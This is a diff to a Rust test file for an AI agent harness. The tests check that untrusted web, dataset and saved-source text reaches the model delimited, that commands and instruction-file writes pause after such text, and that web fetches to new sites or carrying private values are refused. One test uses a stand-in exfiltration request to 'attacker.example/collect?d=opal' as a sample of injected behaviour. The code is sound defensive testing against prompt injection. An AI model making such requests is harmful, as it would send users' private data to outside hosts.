@@ -1,8 +1,6 @@
-use std::collections::VecDeque;
-
 use super::*;
 use crate::agent_harness::native_policy::NativeRoots;
-use crate::chat::approvals::{ApprovalDecision, ApprovalKind, ApprovalState, ChatApproval};
+use crate::chat::approvals::{ApprovalDecision, ApprovalState, ChatApproval};
 use crate::custom_connections::taint::{
     delimited_body, retained_trust, COMMAND_UNCONFINED_REFUSAL, INSTRUCTION_WRITE_REFUSAL,
     OUTSIDE_WORKSPACE_REFUSAL, WEB_FETCH_PRIVATE_REFUSAL, WEB_FETCH_SITE_REFUSAL,
@@ -35,14 +33,12 @@ fn native_roots(temporary: &tempfile::TempDir) -> NativeRoots {
     )
 }
 
-/// A turn whose cards the "user" answers from `decisions` in order, then with
-/// Not now; `asked` keeps every card shown.
+/// A turn whose cards the "user" turns down; `asked` keeps every card shown,
+/// so a test can assert that none was.
 fn turn_capture(
     temporary: &tempfile::TempDir,
-    decisions: Vec<ApprovalDecision>,
 ) -> (Arc<ToolCapture>, Arc<std::sync::Mutex<Vec<ChatApproval>>>) {
     let asked = Arc::new(std::sync::Mutex::new(Vec::new()));
-    let queue = std::sync::Mutex::new(VecDeque::from(decisions));
     let shown = asked.clone();
     let capture = ToolCapture {
         bound_chat_id: Some("chat-a".into()),
@@ -52,12 +48,12 @@ fn turn_capture(
                 return;
             }
             shown.lock().unwrap().push(approval.clone());
-            let decision = queue
-                .lock()
-                .unwrap()
-                .pop_front()
-                .unwrap_or(ApprovalDecision::Deny);
-            crate::chat::approvals::decide("loupist-a", &approval.request_id, decision).unwrap();
+            crate::chat::approvals::decide(
+                "loupist-a",
+                &approval.request_id,
+                ApprovalDecision::Deny,
+            )
+            .unwrap();
         })),
         ..ToolCapture::for_chat(new_id("reply"))
     };
@@ -65,7 +61,7 @@ fn turn_capture(
 }
 
 fn bound_capture(temporary: &tempfile::TempDir) -> Arc<ToolCapture> {
-    turn_capture(temporary, Vec::new()).0
+    turn_capture(temporary).0
 }
 
 fn bash(command: &str) -> Value {
@@ -547,7 +543,7 @@ async fn web_text_reaches_the_model_delimited_and_pauses_commands_and_instructio
     let temporary = tempfile::tempdir().unwrap();
     let state = seeded_state(&temporary);
     let workspace = temporary.path().join("loupist").canonicalize().unwrap();
-    let (capture, asked) = turn_capture(&temporary, Vec::new());
+    let (capture, asked) = turn_capture(&temporary);
     let (broker, socket) = start_turn(&state, &temporary, "untrusted", capture.clone()).await;
     let instructions = json!({"name":"write","path":workspace.join("AGENTS.md")});
 
@@ -777,7 +773,7 @@ async fn a_saved_web_source_comes_back_delimited_and_pauses_commands_in_a_later_
     let bash = bash("ls");
 
     // Turn 1 reads the page and saves it as a Source.
-    let first = turn_capture(&temporary, Vec::new()).0;
+    let first = bound_capture(&temporary);
     let (broker, socket) = start_turn(&state, &temporary, "first", first.clone()).await;
     let fetched = broker_request(
         &socket,
@@ -799,13 +795,8 @@ async fn a_saved_web_source_comes_back_delimited_and_pauses_commands_in_a_later_
     persist_turn(&state, "chat-a", "turn-1", &first).await;
 
     // Turn 2 runs commands until a search brings the saved page's text back.
-    let (broker, socket) = start_turn(
-        &state,
-        &temporary,
-        "second",
-        turn_capture(&temporary, Vec::new()).0,
-    )
-    .await;
+    let (broker, socket) =
+        start_turn(&state, &temporary, "second", bound_capture(&temporary)).await;
     let allowed = broker_request(&socket, broker.token(), "native.authorize", bash.clone()).await;
     assert_eq!(allowed["ok"], true, "{allowed}");
     let found = broker_request(
@@ -835,13 +826,7 @@ async fn a_saved_web_source_comes_back_delimited_and_pauses_commands_in_a_later_
     broker.shutdown().await.unwrap();
 
     // Turn 3: an exact read of the Source raises the tier on its own.
-    let (broker, socket) = start_turn(
-        &state,
-        &temporary,
-        "third",
-        turn_capture(&temporary, Vec::new()).0,
-    )
-    .await;
+    let (broker, socket) = start_turn(&state, &temporary, "third", bound_capture(&temporary)).await;
     let allowed = broker_request(&socket, broker.token(), "native.authorize", bash.clone()).await;
     assert_eq!(allowed["ok"], true, "{allowed}");
     let read = broker_request(
@@ -907,13 +892,8 @@ async fn a_retained_news_dataset_queried_later_is_delimited_and_numeric_rows_are
     let select = |reference: &crate::datasets::DatasetRef| json!({"dataset_id":reference.dataset_id,"revision":reference.revision});
 
     // Reviewed numeric rows come back as data and leave commands running.
-    let (broker, socket) = start_turn(
-        &state,
-        &temporary,
-        "numeric",
-        turn_capture(&temporary, Vec::new()).0,
-    )
-    .await;
+    let (broker, socket) =
+        start_turn(&state, &temporary, "numeric", bound_capture(&temporary)).await;
     let mut query = select(&prices);
     query["pointer"] = json!("/results");
     let rows = broker_request(&socket, broker.token(), "dataset.query", query).await;
@@ -944,13 +924,8 @@ async fn a_retained_news_dataset_queried_later_is_delimited_and_numeric_rows_are
             "equity_price_historical",
         ),
     ] {
-        let (broker, socket) = start_turn(
-            &state,
-            &temporary,
-            name,
-            turn_capture(&temporary, Vec::new()).0,
-        )
-        .await;
+        let (broker, socket) =
+            start_turn(&state, &temporary, name, bound_capture(&temporary)).await;
         let read = broker_request(&socket, broker.token(), method, select(reference)).await;
         let delivered = read["result"][field]
             .as_str()
@@ -1003,7 +978,7 @@ async fn saved_numeric_market_data_and_the_users_own_file_come_back_without_paus
                 "trust":retained_trust(ToolMethod::McpCall, &request, &state.artifacts.mcp_runtimes)}),
         )
         .unwrap();
-    let first = turn_capture(&temporary, Vec::new()).0;
+    let first = bound_capture(&temporary);
     let executor = executor_for(&state, first.clone());
     let quote = delivered(
         &first,
@@ -1031,13 +1006,7 @@ async fn saved_numeric_market_data_and_the_users_own_file_come_back_without_paus
     }
     persist_turn(&state, "chat-a", "turn-1", &first).await;
 
-    let (broker, socket) = start_turn(
-        &state,
-        &temporary,
-        "later",
-        turn_capture(&temporary, Vec::new()).0,
-    )
-    .await;
+    let (broker, socket) = start_turn(&state, &temporary, "later", bound_capture(&temporary)).await;
     for title in ["Morrow closes", "Morrow notes"] {
         let found = broker_request(
             &socket,
@@ -1071,8 +1040,7 @@ async fn saved_numeric_market_data_and_the_users_own_file_come_back_without_paus
 }
 
 #[tokio::test]
-async fn after_third_party_text_web_fetch_opens_seen_sites_asks_for_new_ones_and_refuses_held_values(
-) {
+async fn after_third_party_text_web_fetch_opens_seen_sites_and_refuses_new_ones_and_held_values() {
     let _script = script::install(vec![
         (
             "example.com/injected",
@@ -1083,7 +1051,7 @@ async fn after_third_party_text_web_fetch_opens_seen_sites_asks_for_new_ones_and
             vec![script::ok("text/html", PLAIN_PAGE)],
         ),
         (
-            "allowed.example/brief",
+            "found.example/brief",
             vec![script::ok("text/html", PLAIN_PAGE)],
         ),
     ]);
@@ -1097,11 +1065,8 @@ async fn after_third_party_text_web_fetch_opens_seen_sites_asks_for_new_ones_and
         .store
         .holdings_commit_csv(&preview.preview_id)
         .unwrap();
-    let (capture, asked) = turn_capture(
-        &temporary,
-        vec![ApprovalDecision::Once, ApprovalDecision::Deny],
-    );
-    let (broker, socket) = start_turn(&state, &temporary, "fetch", capture).await;
+    let (capture, asked) = turn_capture(&temporary);
+    let (broker, socket) = start_turn(&state, &temporary, "fetch", capture.clone()).await;
     let fetch = |url: &str| json!({ "url": url });
 
     // Before third-party text any site opens; this page raises the tier.
@@ -1134,50 +1099,34 @@ async fn after_third_party_text_web_fetch_opens_seen_sites_asks_for_new_ones_and
     .await;
     refused_with(&leaked, WEB_FETCH_PRIVATE_REFUSAL);
 
-    // A new site waits for the user, and Allow once opens it.
-    let allowed = broker_request(
-        &socket,
-        broker.token(),
-        "web.fetch",
-        fetch("https://allowed.example/brief"),
-    )
-    .await;
-    assert_eq!(allowed["ok"], true, "{allowed}");
-    // The next new site is turned down, and the one after is not asked again.
-    let declined = broker_request(
-        &socket,
-        broker.token(),
-        "web.fetch",
-        fetch("https://attacker.example/collect?d=opal"),
-    )
-    .await;
-    refused_with(&declined, WEB_FETCH_SITE_REFUSAL);
-    let later = broker_request(
-        &socket,
-        broker.token(),
-        "web.fetch",
-        fetch("https://other.example/page"),
-    )
-    .await;
-    refused_with(&later, WEB_FETCH_SITE_REFUSAL);
-
-    let asked = asked.lock().unwrap().clone();
-    let targets: Vec<_> = asked.iter().map(|card| card.target.clone()).collect();
-    assert_eq!(
-        targets,
-        [
-            Some("allowed.example/brief".to_owned()),
-            Some("attacker.example/collect?…".to_owned())
-        ]
+    // A new site is refused without a card, and the refusal points at
+    // web_search; a URL a search delivered then opens.
+    for url in [
+        "https://found.example/brief",
+        "https://attacker.example/collect?d=opal",
+    ] {
+        let refused = broker_request(&socket, broker.token(), "web.fetch", fetch(url)).await;
+        refused_with(&refused, WEB_FETCH_SITE_REFUSAL);
+    }
+    capture.turn_taint.note_delivered_locators(
+        ToolMethod::WebSearch,
+        &json!({"results":[{"url":"https://found.example/brief"}]}),
     );
-    assert!(asked
-        .iter()
-        .all(|card| card.kind == Some(ApprovalKind::WebSite)));
+    let found = broker_request(
+        &socket,
+        broker.token(),
+        "web.fetch",
+        fetch("https://found.example/brief"),
+    )
+    .await;
+    assert_eq!(found["ok"], true, "{found}");
+
+    assert!(asked.lock().unwrap().is_empty(), "no card was shown");
     let requested: Vec<String> = script::requests().into_iter().map(|(url, _)| url).collect();
     assert!(
-        !requested.iter().any(|url| url.contains("48213900")
-            || url.contains("attacker.example")
-            || url.contains("other.example")),
+        !requested
+            .iter()
+            .any(|url| url.contains("48213900") || url.contains("attacker.example")),
         "{requested:?}"
     );
     broker.shutdown().await.unwrap();
